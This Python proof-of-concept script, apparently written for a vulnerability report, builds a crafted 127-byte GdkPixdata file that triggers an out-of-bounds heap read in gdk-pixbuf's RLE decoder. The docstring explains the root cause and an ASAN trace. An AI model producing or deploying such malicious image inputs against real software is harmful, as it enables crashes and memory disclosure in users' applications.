#!/usr/bin/env python3
"""
VULN-002: Out-of-Bounds Read in RLE Decoder due to Missing rle_buffer Bounds Check
File: gdk-pixbuf/gdk-pixbuf/gdk-pixdata.c, lines 459-494
Function: gdk_pixbuf_from_pixdata()

The RLE decoder loop only checks `image_buffer < image_limit` (output bound)
but never checks if `rle_buffer` has exceeded `pixel_data + pixel_data_length`.
When RLE input is exhausted, rle_buffer reads beyond the allocated pixel data.

Attack path:
  gdk_pixbuf_new_from_file(.gdkp) -> io-pixdata loader
  -> gdk_pixdata_deserialize() -> gdk_pixbuf_from_pixdata()

Key insight (GLib GString allocation):
  - g_string_new("") calls g_string_sized_new(2) which calls
    g_string_maybe_expand(string, MAX(2, 64)=64).
  - g_string_maybe_expand allocates g_nearest_pow(MAX(0+64+1, 64)) = g_nearest_pow(65) = 128 bytes.
  - For any file <= 127 bytes: no reallocation occurs; GString stays at 128 bytes.
  - OOB is at str[128] (ASAN red zone).

File = 127 bytes (24 header + 103 pixel data):
  - GString allocation: 128 bytes; null terminator at str[127]; OOB at str[128]
  - pixel_data = str[24] (103 bytes of crafted RLE)
  - 25 repeat-1-pixel runs advance rle_buffer to str[124]
  - Partial literal at str[124..126]; 3rd color byte read from str[127] (within alloc)
  - rle_buffer advances to str[128] = ASAN red zone
  - With image_limit = 168 (width=2, height=28, rowstride=6) > 78 output bytes so far,
    loop continues and reads str[128] -> heap-buffer-overflow READ

ASAN confirmation (empirically verified):
  "READ of size 1 ... 0 bytes to the right of 128-byte region"
  in gdk_pixbuf_from_pixdata <- try_load <- pixdata_image_load_increment
  <- generic_load_incrementally <- _gdk_pixbuf_generic_image_load
  <- gdk_pixbuf_new_from_file <- main
"""

import struct
import os

# GdkPixdata constants (matching actual gdk-pixdata.h values)
GDK_PIXBUF_MAGIC_NUMBER    = 0x47646b50   # 'GdkP'
GDK_PIXDATA_COLOR_TYPE_RGB = 0x01
GDK_PIXDATA_SAMPLE_WIDTH_8 = 0x01 << 16  # 0x00010000
GDK_PIXDATA_ENCODING_RLE   = 0x02 << 24  # 0x02000000
GDK_PIXDATA_HEADER_LENGTH  = 24          # 6 x uint32 big-endian

# Build pixdata_type: RLE | 8-bit samples | RGB = 0x02010001
pixdata_type = GDK_PIXDATA_ENCODING_RLE | GDK_PIXDATA_SAMPLE_WIDTH_8 | GDK_PIXDATA_COLOR_TYPE_RGB

# Image dimensions
# image_limit = rowstride * height = 6 * 28 = 168 bytes
# After 26 decoded pixels (78 bytes) image_buffer < image_limit -> loop continues -> OOB
width     = 2
height    = 28
rowstride = 6   # width * bpp = 2 * 3; rowstride >= width required

# --- Build RLE pixel data (103 bytes) ---
# Part 1: 25 repeat-1-pixel runs (100 bytes)
# Each run: 0x81 (repeat, length=1) + 3 color bytes
# Repeat run: control byte consumed via ++, bpp bytes consumed as color, rle_buffer += bpp after loop
# rle_buffer advance per run: 1 (control) + 3 (color) = 4 bytes total
repeat_run = b'\x81\xff\x00\x00'   # repeat 1 red pixel
rle_part1  = repeat_run * 25       # 100 bytes; rle_buffer goes str[24]->str[28]->...->str[124]

# Part 2: partial literal-1-pixel run (3 bytes at str[124..126])
# 0x01 = literal run, 1 pixel = 3 color bytes
# Literal: control at str[124] consumed via ++, rle_buffer=str[125]
#   memcpy(image_buffer, str[125], 3) reads str[125], str[126], str[127] (null, in 128-byte alloc)
# After memcpy: rle_buffer += 3 -> str[128] = ASAN red zone
rle_part2  = b'\x01\x00\x00'       # 3 bytes; 4th color byte = str[127] = null (within alloc)

pixel_data = rle_part1 + rle_part2
assert len(pixel_data) == 103, f"Expected 103 bytes, got {len(pixel_data)}"

# Total file = 24 (header) + 103 (pixel_data) = 127 bytes
total_length = GDK_PIXDATA_HEADER_LENGTH + len(pixel_data)
assert total_length == 127, f"Expected 127 bytes total, got {total_length}"

# GLib GString initial allocation = 128 bytes (g_string_sized_new(2) -> expand to 128)
# For a 127-byte file: 0 + 127 >= 128 is FALSE -> no realloc, stays at 128 bytes
# str[127] = null terminator (within allocation); str[128] = ASAN red zone

# Pack 24-byte header (big-endian uint32 x6)
header = struct.pack('>IIIIII',
    GDK_PIXBUF_MAGIC_NUMBER,  # magic
    total_length,              # length = 127
    pixdata_type,              # 0x02010001
    rowstride,                 # 6
    width,                     # 2
    height,                    # 28
)
assert len(header) == 24

poc_bytes = header + pixel_data
assert len(poc_bytes) == 127

out_dir  = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_002.pixdata')

with open(out_path, 'wb') as f:
    f.write(poc_bytes)

print(f"[+] Generated {out_path} ({len(poc_bytes)} bytes)")
print(f"    magic:        0x{GDK_PIXBUF_MAGIC_NUMBER:08x}  ('GdkP')")
print(f"    length:       {total_length}  (header 24 + pixel_data {len(pixel_data)})")
print(f"    pixdata_type: 0x{pixdata_type:08x}  (RLE | SAMPLE_WIDTH_8 | RGB)")
print(f"    rowstride:    {rowstride}, width: {width}, height: {height}")
print(f"    image_limit:  {rowstride * height} bytes")
print(f"    pixel_data:   {pixel_data.hex()}")
print(f"    GString alloc: 128 bytes (initial); null at str[127]; OOB at str[128]")
print(f"    rle_buffer: str[24]->...->str[124](ctrl)->str[125](color)->str[128](OOB)")
